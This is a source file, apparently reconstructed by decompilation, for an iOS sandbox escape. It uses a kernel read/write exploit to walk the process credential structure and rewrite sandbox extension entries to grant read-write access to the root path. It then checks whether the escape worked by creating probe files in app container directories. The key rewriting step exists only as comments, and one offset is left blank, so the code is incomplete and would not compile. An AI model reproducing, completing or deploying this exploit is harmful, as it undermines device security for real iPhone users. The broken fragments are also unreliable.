// sandbox_escape.c — Sandbox escape via credential label rewriting
// Reconstructed from 5013 v3.2.17 binary (decompiled via Ghidra)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

#import <Foundation/Foundation.h>

#include "../exploit/krw.h"
#include "../exploit/exploit.h"
#include "../exploit/offsets.h"

// Sandbox extension permission string
static const char *kReadWriteExtension = "com.apple.app-sandbox.read-write";
static const char *kRootPath = "/";

bool sandbox_access_is_active(void) {
    // Probe multiple container paths to verify sandbox escape worked
    static const char *probePaths[] = {
        "/private/var/mobile/Containers/Data",
        // second path checked in a loop
        NULL
    };

    @autoreleasepool {
        for (int i = 0; probePaths[i]; i++) {
            pid_t pid = getpid();
            NSString *uuid = [[NSUUID UUID] UUIDString];
            NSString *probeName = [NSString stringWithFormat:@"5013_access_probe_%d_%@", pid, uuid];
            NSString *dir = [NSString stringWithUTF8String:probePaths[i]];
            NSString *path = [dir stringByAppendingPathComponent:probeName];

            int fd = open([path fileSystemRepresentation],
                          O_CREAT | O_RDWR | O_TRUNC | O_EXCL, 0644);
            if (fd < 0) return false;

            char c = '1';
            long written = write(fd, &c, 1);
            char readBuf = 0;
            bool readOk = false;
            if (lseek(fd, 0, SEEK_SET) == 0) {
                readOk = (read(fd, &readBuf, 1) == 1);
            }

            int closeRet = close(fd);
            int unlinkRet = unlink([path fileSystemRepresentation]);

            bool success = false;
            if (readBuf == '1') {
                success = (written == 1) && readOk;
            }
            if (unlinkRet != 0 || closeRet != 0) {
                success = false;
            }

            if (!success) return false;
        }
    }
    return true;
}

void sandbox_escape(uint64_t procAddr) {
    // Walk: proc -> ucred -> cr_label -> l_perpolicy -> sandbox extensions
    // proc + 0x18 -> ucred pointer chain
    uint64_t ucred = kread_ptr(procAddr + 0x18);
    NSLog(@"[sandbox_escape] ucred: 0x%llx", ucred);

    // Navigate through credential structure to sandbox label
    // ucred -> cr_label -> l_perpolicy[sandbox_slot]
    uint64_t crLabel = kread_ptr(ucred + /* cr_label offset varies */);

    // Find sandbox extension entries in the perpolicy array
    // Rewrite extension paths to "/" and fill with read-write permissions

    // For each extension slot:
    //   - Write "/" as the path string
    //   - Write "com.apple.app-sandbox.read-write" as the extension type

    // The exact offsets for the sandbox label structure depend on the iOS version
    // and are set by offsets_init()

    // After rewriting, verify the escape
    bool escaped = sandbox_access_is_active();
    if (escaped) {
        NSLog(@"[sandbox_escape] sandbox escape verified successfully");
    } else {
        NSLog(@"[sandbox_escape] sandbox escape verification FAILED");
    }
}
